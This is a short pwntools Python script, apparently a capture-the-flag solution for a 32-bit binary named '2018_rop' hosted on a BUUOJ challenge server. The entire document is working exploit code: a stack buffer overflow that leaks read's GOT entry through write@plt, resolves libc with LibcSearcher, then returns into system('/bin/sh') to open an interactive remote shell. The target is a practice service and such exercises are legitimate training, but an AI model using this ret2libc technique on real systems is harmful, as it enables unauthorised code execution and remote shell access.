from pwn import *
from LibcSearcher import *

context.os = "linux"
context.arch = "i386"
context.log_level = "debug"

vulnAddr = 0x8048474
writePlt = 0x80483a0

e = ELF("./2018_rop")
readGot = e.got["read"]

p = remote("node4.buuoj.cn", 26844)

payload1 = b'a'*(0x88+4) + p32(writePlt) + p32(vulnAddr) + p32(1) + p32(readGot)+p32(8)

p.sendline(payload1)

readRealAddr = u32(p.recv(4))
p.success("read real address: 0x%x\n", readRealAddr)

libc = LibcSearcher("read", readRealAddr)

offset = readRealAddr - libc.dump("read")

systemAddr = libc.dump("system") + offset
binshStr = libc.dump("str_bin_sh") + offset

payload2 = b'a'*(0x88+4)+p32(systemAddr) + p32(0xdeadbeef) + p32(binshStr)

p.sendline(payload2)

p.interactive()

